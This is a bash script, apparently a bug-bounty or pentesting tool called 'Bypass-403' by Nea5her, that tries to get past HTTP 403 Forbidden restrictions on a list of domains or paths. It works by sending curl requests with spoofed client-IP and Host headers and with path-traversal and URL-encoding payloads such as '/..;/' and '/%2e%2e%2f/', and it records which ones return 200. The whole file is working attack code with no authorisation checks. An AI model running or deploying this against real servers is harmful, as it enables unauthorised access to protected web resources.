#!/bin/bash

# Bypass-403-Forbidden-Error By Nea5her
echo "                                               By Nea5her"
echo "./bypass-403.sh <subdomain-file or single domain> [-w wordlist.txt | <single path>] [-o output-file]"
echo " "

# Check if at least one argument is provided
if [ "$#" -lt 1 ]; then
    echo "Usage: $0 <subdomain-file or single domain> [-w wordlist.txt | <single path>] [-o output-file]"
    exit 1
fi

# Default output file
output_file="200-outputs.txt"

# Check if the output file option (-o) is provided and correctly handle it
if [[ "$@" == *"-o"* ]]; then
    # Extract the output file after the '-o' flag
    output_file=$(echo "$@" | grep -oP "(?<=-o )\S+")
    echo "Output will be saved to $output_file"
fi

# Determine if input is a file or a single domain
if [[ -f $1 ]]; then
    input_file=$1
    echo "Using subdomain file: $input_file"
elif [[ $1 =~ ^https?:// ]]; then
    input_file=""
    single_domain=$1
    echo "Using single domain: $single_domain"
else
    echo "Invalid input. Provide either a file or a single domain."
    exit 1
fi

# Check if the second argument is a wordlist or a single path
wordlist=""
single_path=""
if [[ "$2" == "-w" ]]; then
    wordlist=$3
elif [[ -n $2 && "$2" != "-o" ]]; then
    single_path="/$2"  # Treat the second argument as a single path, prepend '/'
fi

# Function to check bypass methods
check_bypass() {
    local domain=$1
    local path=$2

    echo "Checking $domain$path"

    # Header-based bypass methods
    headers=( 
        "X-Originating-IP: 127.0.0.1"
        "X-Forwarded-For: 127.0.0.1"
        "X-Forwarded: 127.0.0.1"
        "Forwarded-For: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "X-Remote-Addr: 127.0.0.1"
        "X-ProxyUser-Ip: 127.0.0.1"
        "X-Original-URL: 127.0.0.1"
        "Client-IP: 127.0.0.1"
        "True-Client-IP: 127.0.0.1"
        "Cluster-Client-IP: 127.0.0.1"
        "Host: localhost"
    )

    for header in "${headers[@]}"; do
        response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "$header" "$domain$path")
        
        # Check for 200 status and save it
        if [[ "$response" =~ "200" ]]; then
            echo -e "\033[0;32m  --> ${domain}${path} -H $header : $response\033[0m"
            echo "${domain}${path} -H $header : $response" >> "$output_file"
        else
            echo "  --> ${domain}${path} -H $header : $response"
        fi
    done

    # Payload-based bypass methods
    payloads=( 
        "/*" "/%2f/" "/./" "/./." "/*/" "?" "??" "&" "#" "%" "%20" "%09"
        "/..;/" "/../" "/..%2f" "/..;/" "/.././" "/..%00/" "/..%0d" "/..%5c"
        "/..%ff/" "/%2e%2e%2f/" "/.%2e/" "/%3f" "%26" "%23" ".json"
    )

    for payload in "${payloads[@]}"; do
        response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$domain$path$payload")

        # Check for 200 status and save it
        if [[ "$response" =~ "200" ]]; then
            echo -e "\033[0;32m  --> ${domain}${path}${payload} : $response\033[0m"
            echo "${domain}${path}${payload} : $response" >> "$output_file"
        else
            echo "  --> ${domain}${path}${payload} : $response"
        fi
    done
}

# Loop through either file or single domain
if [[ -n $input_file ]]; then
    # Case: Multiple subdomains from a file
    while IFS= read -r subdomain; do
        echo "-----------------------------"
        # No wordlist provided, check the root path '/'
        check_bypass "$subdomain" "/"
    done < "$input_file"
else
    # Case: Single domain
    echo "-----------------------------"
    if [[ -n $single_path ]]; then
        # If a single path is provided, use it directly
        check_bypass "$single_domain" "$single_path"
    elif [[ -n $wordlist ]]; then
        # If wordlist is provided, prepend '/' to each word and check each path for the single domain
        while IFS= read -r word; do
            path="/$word"
            check_bypass "$single_domain" "$path"
        done < "$wordlist"
    else
        # No wordlist or single path, check the root path
        check_bypass "$single_domain" "/"
    fi
fi

echo "Hey, I am done. Thanks."
